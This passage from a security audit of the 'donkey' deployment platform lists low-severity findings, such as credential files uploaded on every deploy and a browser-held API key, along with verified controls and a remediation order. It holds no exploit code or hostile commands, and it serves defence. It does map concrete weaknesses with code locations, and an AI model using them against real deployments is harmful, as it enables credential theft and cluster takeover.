| Upload skip-list is basename-only and ignores `.gitignore`/`.dockerignore`, so `.npmrc`, `.git-credentials`, `terraform.tfvars`, `terraform.tfstate`, `kubeconfig`, service-account JSON are uploaded on every deploy (`config/master.key` is now caught by the `.key` suffix) | `internal/config/upload.go:24-44` |
| Addon `version` is unvalidated and becomes a container image tag (not exploitable — the repository prefix is fixed by concatenation) | `internal/server/handlers.go:310-326` |
| Access rules (user emails, group names) stored in a route annotation readable by anything with route-read — including the console's own admin allowlist | `pkg/runtime/kubernetes/manifests/route.go:28-30,59-74` |
| `donkey-system` carries no Pod Security Standards labels while every tenant namespace enforces `baseline`, so the namespace holding the cluster-admin ServiceAccount has no admission floor. Necessary today for privileged BuildKit | `manifests/system.go:225-234` vs `app.go:231-232` |
| The per-space `OPENAI_API_KEY` is pulled into the browser and held in React state with `dangerouslyAllowBrowser: true`. Defensive about the destination (rebuilds the URL as `${location.origin}/ai/v1`) and memory-only, so realising it needs a script-execution primitive the CSP currently denies | `web/src/AiDialog.tsx:74,99-108` |

---

## Controls that hold

Worth recording, because it shapes where effort should go. Each was re-verified against the current tree; the corrections are listed first.

### Corrections to the previous review

- **REGRESSED — "the admin console keeps bearer auth and bypasses the gateway."** Both halves are now false. See finding 1.
- **OVERSTATED — "pod hardening: app pods and pre-deploy jobs set `RunAsNonRoot` and non-root UID/GID."** They do not (`manifests/app.go:394-404`, and `predeploy.go:47-58` before that file was removed with finding 2). They set the other four controls. This is plausibly deliberate, since app images choose their own user, but the control as written was not accurate. The files helper and all addons *do* pin non-root UIDs.
- **STALE — "`exec.Command` appears exactly once."** Now three times, one per OS branch in `browse()` (`internal/cli/open.go:48,50,52`). Still argv arrays, still never through a shell.
- **IMPROVED — the console no longer receives the API token.** The static token is gone; the console rides the gateway's `HttpOnly; Secure; SameSite=Lax` session cookie and sets no `Authorization` header (`web/src/api.ts:1-3,224-236`).

### Verified as holding

**Input handling and injection.** No string-templated YAML anywhere — every object is a typed Go struct marshalled by the Kubernetes libraries, so there is no field-escape surface for names, domains, env values or annotations. The database browser routes every identifier through `pgx.Identifier.Sanitize()` (`dbadmin.go:138,168,251,351,354,440,484`) and every value through bind parameters; `LIMIT`/`OFFSET` are `strconv.Atoi` results clamped to range. DSN injection via `{db}` is closed by re-serializing through `url.String()` (`dbadmin.go:57-64`). Name validation is a strict RFC-1123 label applied at the edge of every handler.

**Archive and path handling.** Build-context extraction (`internal/server/untar.go:297-314`) rejects traversal, absolute and drive-relative paths, normalizes backslashes, drops symlinks, hardlinks and device nodes in both the tar and zip paths, masks setuid/setgid, and caps unpacked size and file count. The file browser resolves every path with `realpath` inside the pod and **re-checks containment on the resolved output** (`pkg/runtime/kubernetes/files.go:407-409,481-497`), resolving the leaf as well as the parent so a pre-existing symlink cannot be written through. The Docker provider mirrors this (`pkg/runtime/docker/files.go:185-201,418-443`). There is no client-side extraction at all. Tar packing uses `IsRegular()` and does not follow symlinks.

**Command execution.** Every helper invocation is an argv slice, never a shell line, in both runtimes. With `preDeploy` removed (finding 2), the only remaining `sh -c` site is `initVolumeDirs`, whose interpolated values are `StorageSubPath` slugs restricted to `[a-z0-9-]` by construction.

**Namespace and space boundaries.** `ValidateSpace` reserves the namespace mapping onto `donkey-system`; `CheckNamespaceFree` refuses to adopt any namespace lacking donkey's annotation; both deletion paths re-check ownership. `Destroy` removes only one app, while `DeleteSpace` deliberately removes the complete boundary — routes, apps, addons, bindings and data. Every Kubernetes sweep is narrowed by installation plus logical space labels; Docker verifies the managed network and logical space before cascading. Name collisions are guarded in both directions (an addon cannot take an app's name and vice versa), and the `shared` API owner is reserved. On Docker, `ctrName`/`netName`/`volName` interpolate only `ValidName`-checked labels, which exclude the dot separator the scheme relies on.

**Cryptography.** All randomness is `crypto/rand`; zero occurrences of `math/rand` or `rand.Seed`. No `InsecureSkipVerify` anywhere; `--ca-file` *adds* to the system pool rather than replacing it, an unreadable file is a hard error, and the `SystemCertPool` error fallback uses an empty (more restrictive) pool. CLI tokens are AES-GCM sealed identities with purpose binding, a length guard before slicing the nonce, a non-empty-subject requirement and an expiry check — so verification is the AEAD tag check, constant-time by construction.

**Gateway request handling.** The session and login cookies are stripped before proxying, inbound `X-Auth-Request-*` are deleted unconditionally in `Rewrite` (case-insensitively, since Go canonicalizes header names), and using `Rewrite` rather than `Director` discards client `X-Forwarded-*`. ID token verification is complete — signature, `iss`, `aud`, `exp`, with nonce and state bound — and no `Skip*` flags exist. The post-login return has no open redirect: `RequestURI()` escapes backslashes so the `//` guard is not bypassable, and cross-host returns are confined to `ssoHost`. Certificate issuance is gated by the routing table (`tls.go:120-132`), so a hostname donkey does not serve cannot obtain a certificate. Error pages HTML-escape their input.

**AI subsystem containment.** The explorer uses `os.Root`, so `..`, absolute paths and symlink escape fail at the syscall level, and re-opening by name is safe because `os.Root` re-validates each call; uploads never contain symlinks in the first place. Fix proposals require `fs.ValidPath`, are read and written through `os.Root`, require per-file confirmation and **refuse to apply under `--yes`**. `--tag`/`--no-build` cannot point an app at a foreign image (`SameRegistry` is prefix-anchored with a trailing slash). A Dockerfile path from an attacker-controlled `donkey.yaml` cannot escape the build context. Registry credentials are released only to the matching host.

**Console.** Strict CSP — `script-src 'self'` with no `unsafe-inline` and no `unsafe-eval`, no wildcards, plus `frame-ancestors 'none'` and `base-uri 'none'`; the only weakening is `'unsafe-inline'` in *style*-src. Zero hits across `web/src` for `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function`, `document.write`, `srcdoc`, `localStorage`, `sessionStorage` or `document.cookie`. Markdown rendering never enables `allowHtml`, and the highlighter escapes. Blob downloads set `download` before `click()`. The whole API mux is wrapped in `http.NewCrossOriginProtection()`, and the tunnel upgrader inherits gorilla's same-origin default.

**Credential hygiene.** Dry-runs render with `includeCreds=false`, so the registry password never reaches a terminal or CI log. Build and startup output is scrubbed against a `KnownSecrets` list (with the gaps noted in finding 10). Addon credentials are always `secretKeyRef` on Kubernetes, never inlined into a pod spec, and a re-provision reuses the existing credential rather than silently rotating it. Passwords are 192-bit `crypto/rand`. `donkey env` masks values unless `--show-values` is passed; catalog and list endpoints return key *names* only.

**CLI safety.** Destructive commands (`destroy`, `files rm`, `addon remove`) default confirmation to `false`, treat `--yes` as "answer with the default" rather than "yes", and error out in non-interactive mode rather than proceeding.

---

## Remaining work, in suggested order

1. **Finding 1** — the one that matters. Seal the forwarded identity with the session key both sides already hold, and add the NetworkPolicy in front of `donkey-server`. Also decide what an empty `Admins` should mean; "every account the IdP admits" is a surprising default.
2. ~~**Finding 2**~~ — done: `preDeploy` was removed outright, so there is no command for donkey to run, confirm or screen.
3. **Finding 5** — three lines in `replaceContainer` (`CapDrop`, `SecurityOpt`, `User`) bring the Docker runtime to parity with the Kubernetes posture.
4. **Findings 6, 7, 13** — small and self-contained: `resourceNames` on the gateway's secrets Role, `email_verified` in the claims struct, a `state` parameter on the CLI login callback.
5. **Findings 14 and 15** — a few lines each: reject `http://` for non-loopback hosts, `os.Chmod` the token file after writing.
6. **Finding 10** — reuse the existing `redact()` on the analyze path, extend `deniedFile`, and add `app.Env`/`app.Build.Env` to `KnownSecrets`.
7. **Findings 4, 9, 11** — the network work: tenant NetworkPolicies restore the `internal` guarantee and close BuildKit's lateral path; BuildKit also needs mTLS and `AutomountServiceAccountToken: false`; the Docker binding-host rewrite is a one-line change to `ctrName`. Needs a cluster to validate against.
8. **Findings 3 and 8** — the larger structural changes: scoped RBAC in place of `cluster-admin`, and a pull-only registry credential.
9. The [lower-severity items](#lower-severity-items) as a batch — the fail-open access annotation and the trailing-slash route are the two with real consequences.
